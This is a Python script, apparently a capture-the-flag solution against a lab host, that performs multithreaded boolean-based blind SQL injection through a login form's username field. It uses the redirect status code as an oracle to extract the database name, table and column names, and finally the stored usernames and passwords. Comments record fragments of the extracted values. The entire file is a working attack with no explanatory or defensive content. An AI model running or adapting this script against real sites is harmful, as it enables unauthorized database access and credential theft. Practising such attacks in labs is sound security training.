import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://kitty.thm/index.php"
charset = sorted(string.printable)# string.ascii_letters + string.digits + " _{}-(),~$%^&*()")
true_status_code = 302
max_len = 100
max_workers = 10

def condition_result_length_is_at_least(query, mid):
    payload = f"a' || length({query}) >= {mid} -- "
    data = {"username": payload, "password": "a"}
    try:
        r = requests.post(url, data=data, timeout=5, allow_redirects=False)
        return r.status_code == true_status_code
    except requests.RequestException:
        return False

def find_length(query, max_length):
    low, high = 1, max_length
    while low <= high:
        mid = (low + high) // 2
        if condition_result_length_is_at_least(query, mid):
            low = mid + 1
        else:
            high = mid - 1
    return high

def check_condition(query, pos, ch, operator):
    payload = f"a' || ord(substr({query}, {pos}, 1)) {operator} ord('{ch}') -- "
    data = {"username": payload, "password": "a"}
    try:
        r = requests.post(url, data=data, timeout=5, allow_redirects=False)
        return r.status_code == true_status_code
    except requests.RequestException:
        return False

def binary_search_char(query, pos):
    low, high = 0, len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        ch = charset[mid]
        if check_condition(query, pos, ch, '>='):
            low = mid + 1
        else:
            high = mid - 1
    return charset[high] if 0 <= high < len(charset) else None

def extract(query, length):
    result = [""] * length

    def worker(pos):
        return pos, binary_search_char(query, pos)

    print(f"[i] Extracting: {query}")
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(worker, pos) for pos in range(1, length + 1)]
        for future in as_completed(futures):
            pos, ch = future.result()
            if ch is None:
                print(f"[-] No char at pos {pos}. Stopping.")
                for f in futures:
                    f.cancel()
                break
            result[pos - 1] = ch
            # print(f"[+] {pos}: {ch}")

    extracted = "".join(result).rstrip("\x00 ").strip()
    print(f"\n[+] Done:\n{extracted}")
    return extracted


if __name__ == "__main__":
# MywEBSITE
    query = "(select database())"
    length = find_length(query, max_len)
    db_schema = extract(query, length)
    print("Extracted schema snippet:\n", db_schema)

# siteusers
    query = "(SELECT group_concat(table_name) FROM information_schema.tables where table_schema=database())"
    length = find_length(query, max_len)
    db_schema = extract(query, length)
    print("Extracted tables snippet:\n", db_schema)

# ID,uSERNAME,PASSwORD,CREATED9AT,ID,uSERNAME,PASSwORD,CREATED9AT
    query = "(SELECT group_concat(column_name) FROM information_schema.columns where table_name='siteusers')"
    length = find_length(query, max_len)
    db_schema = extract(query, length)
    print("Extracted columns snippet:\n", db_schema)

# KItt~
    query = "(SELECT concat(username,':',password) FROM siteusers)"
    length = find_length(query, max_len)
    db_schema = extract(query, length)
    print("Extracted credentials snippet:\n", db_schema)

